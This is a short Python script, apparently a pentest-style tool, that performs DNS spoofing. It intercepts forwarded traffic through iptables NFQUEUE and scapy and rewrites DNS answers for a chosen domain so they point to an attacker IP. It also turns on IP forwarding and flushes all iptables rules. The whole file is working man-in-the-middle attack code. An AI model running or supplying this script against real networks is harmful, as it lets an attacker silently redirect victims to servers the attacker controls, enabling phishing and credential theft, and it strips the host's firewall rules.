import scapy.all as scapy
import subprocess
import netfilterqueue


# domain name will the only website we want to spoof
def dns_spoof(domainname,attackerIP):
	def process_packet(packet):
#		print(packet.summary())
		# convert Netfilter Queue packet to Scapy packet
		scapy_packet = scapy.IP(packet.get_payload())
#		print (scapy_packet.summary())
		# Check if domain name in the qname of the DNS packet
		if scapy_packet.haslayer(scapy.DNSRR):
			qname = scapy_packet[scapy.DNSQR].qname
			print (qname)
			# create new DNS answer
			if domainname in qname:
				answer = scapy.DNSRR(rrname=qname,rdata=attackerIP)
				scapy_packet[scapy.DNS].an = answer
				scapy_packet[scapy.DNS].ancount = 1

				# delete len and checksums, scapy will generate new ones
				del scapy_packet[scapy.IP].len
				del scapy_packet[scapy.IP].chksum
				del scapy_packet[scapy.UDP].len
				del scapy_packet[scapy.UDP].chksum



			#convert the packet back 
			packet.set_payload(str(scapy_packet()))

		#forward all the packets
		packet.accept()

	# enable IP forwarding
	subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward",shell=True)
	# Insert queue 0 to iptables
	subprocess.call("iptables -X",shell=True)
	subprocess.call("iptables -F",shell=True)
	subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0",shell=True)
	print ("Create the Netfilter Queue Num 0")

	# Bind to the queue 0
	queue = netfilterqueue.NetfilterQueue()
	queue.bind(0,process_packet)
	print ("Binding to Netfilter Queue 0")
	queue.run()



